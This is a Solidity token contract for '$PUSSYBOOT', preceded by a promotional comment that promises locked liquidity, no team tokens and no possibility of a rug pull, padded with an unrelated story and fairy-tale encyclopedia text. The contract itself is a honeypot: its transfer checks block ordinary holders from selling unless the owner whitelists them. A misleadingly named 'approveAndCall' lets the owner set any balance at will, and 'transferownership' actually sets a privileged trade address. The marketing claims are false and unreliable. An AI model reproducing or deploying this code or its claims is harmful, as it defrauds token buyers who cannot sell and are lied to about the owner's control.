/**
 *Submitted for verification at Etherscan.io on 2021-11-18
*/

/*
PUSS IN BOOTS AIMS TO GO ABOVE AND BEYOND FOR ITS COMMUNITY, OUR COMMUNITY IS EVERYTHING TO US AND THE FOUNDATION FOR OUR SUCCESS. PUSS IN BOOTS IS HAPPY TO PROVIDE EVERYONE THE OPPORTUNITY TO INVEST SAFELY INTO THE MOST CURRENT AND HOTTEST PROJECT LAUNCH ON ETHEREUM.

What is $PUSSYBOOT?
PUSS IN BOOTS  ($PUSSYBOOT) combats inflation via systemic and logical forms of marketing, driving buying pressure towards the token, providing growth for the community.


Dare to dream
To accomplish great things, we must not only act, but also dream; not only plan, but also believe. PUSS IN BOOTS  are here to draw investor attention to the ETH space, here to make a difference. Our aim… our ambition is to create something magical and we won’t stop until we get there!

Happy community = Token success
Our philosophy is to create an air of excitement daily, maintaining hype and drawing new investors in. A transparent team, community related decisions, you can all take part in this success and we look forward to welcoming to aboard the amazing journey.

A pinpoint game plans
Focused and succinct in our decision making at all times, we act upon logic and not emotion or desperation!

24/7 support
Our team is global; therefore, we have the perks to showcase support not just within the Uk but on a global scale… If you have any questions, we are here to help!


NEXT GEN NFTS
MULTI-BLOCKCHAIN USE
ENDLESS POSSIBILITIES
Puss In Boots is here to stay. No idea is too big, no task is too complex with the support of our community. DAO proposals and voting will lead Puss In Boots in a positive direction fully decided on by $PUSSYBOOT holders.


FAQ
Answering your questions.

How is Puss In Boots different than other cryptos like PUSSYBOOT Inu or Dogecoin?

Puss In Boots ($PUSSYBOOT) has a fully distributed decentralized supply, 50% of tokens were burnt and 50% were locked as liquidity until 2099. This means no one controls the price of PUSSYBOOT besides you, the community. No developer tokens, no team tokens, no one can dump PUSSYBOOT bc no more PUSSYBOOT exist. No one can rug pull PUSSYBOOT bc the liquidity is locked for over 78 more years. Puss In Boots is likely the only cryptocurrency who can say this. On the other hand PUSSYBOOT Inu gave its tokens to Vitalik. He may lose the keys, he may suffer unfortunate events, he is only human and can make mistakes. The only 100% way to protect holders is to truly burn and lock tokens like Puss In Boots($PUSSYBOOT) did, not to send them to Vitalik the ETH founder like PUSSYBOOT Inu($SHIB) did.


Is the PUSSYBOOT token accessible, does it have any utility?

$PUSSYBOOT is a crypto token native to the Ethereum Blockchain (ETH) network. The amount of people using Ethereum Blockchain has grown by several million this year alone. Quicky becoming a favorite network for both developers and users the ETH network is much faster and much cheaper (up to 50x cheaper) than the older Ethereum Network which is used by SHIB. Since Puss In Boots is native to Ethereum Blockchain $PUSSYBOOT can be used in thousands of decentralized applications much more quickly and much less expensively than many other tokens not on this network. These applications are things like swaps, farming, staking, blockchain games, NFT applications, community voting, and much more. Ethereum Blockchain is constantly growing, new applications are being developed here every day.

How do I buy PUSSYBOOT token?
-
Currently PUSSYBOOT are available on UniSwap here. We strongly believe in the true nature of crypto and the freedoms decentralized exchanges offer our users. Early in it's development PUSSYBOOT will only be available on DEX exchanges but at some time in the near future PUSSYBOOT will become available on centralized exchanges as well.
Fate is a fickle thing, it can be searched for, or it can be handed to you. While out for a walk after school, it found one boy deep in thought. The boy was average, not possessing any particular skills or talents. His greatest strength came in the form of emotion. He was a deeply caring boy, looking to comfort others rather than himself. Near the end of his walk, his mind was overtaken by the sound of a creature in need, and he searched wildly for the source. He came upon a pond, where in the middle of it he saw a gorgeous brown cat, desperately trying to get free. Without hesitation he dove into the water, intent on saving the helpless animal. In his quick reaction, he failed to remember a vital piece of information, he couldn’t swim. Cold and darkness overtook him as he sunk below the surface, losing sight of the cat. With all the strength he possessed, the boy reached out and felt the warm body of the creature, pushing him to the shallower waters, all the while sinking lower and lower. Helpless, the boy thought all was lost and succumbed to the fate he believed he was given. The silence before death was broken by a voice as sweet as honey, it was the cat speaking to him. His name was Havana, and he was touched by the boy’s actions. Havana did not believe it was right for the boy to die and wanted to share a life of his own for him. In doing so, Havana unknowingly released 2 lives, one going to the boy he desperately wanted to save and the other finding its way to an unsuspecting girl, hoping for a change. The two would share a bond that neither knew about until the time came when they would find each other.

"Master Cat or the Booted Cat" (Italian: Il gatto con gli stivali; French: Le Maître chat ou le Chat botté), commonly known in English as "Puss in Boots", is an Italian[1][2] fairy tale, later spread throughout the rest of Europe, about an anthropomorphic cat who uses trickery and deceit to gain power, wealth, and the hand of a princess in marriage for his penniless and low-born master.

The oldest written telling is by Italian author Giovanni Francesco Straparola, who included it in his The Facetious Nights of Straparola (c. 1550–1553) in XIV–XV. Another version was published in 1634 by Giambattista Basile with the title Cagliuso, and a tale was written in French at the close of the seventeenth century by Charles Perrault (1628–1703), a retired civil servant and member of the Académie française. There is a version written by Girolamo Morlini, from whom Straparola used various tales in The Facetious Nights of Straparola.[3] The tale appeared in a handwritten and illustrated manuscript two years before its 1697 publication by Barbin in a collection of eight fairy tales by Perrault called Histoires ou contes du temps passé.[4][5] The book was an instant success and remains popular.[3]
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract PussInBoots {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}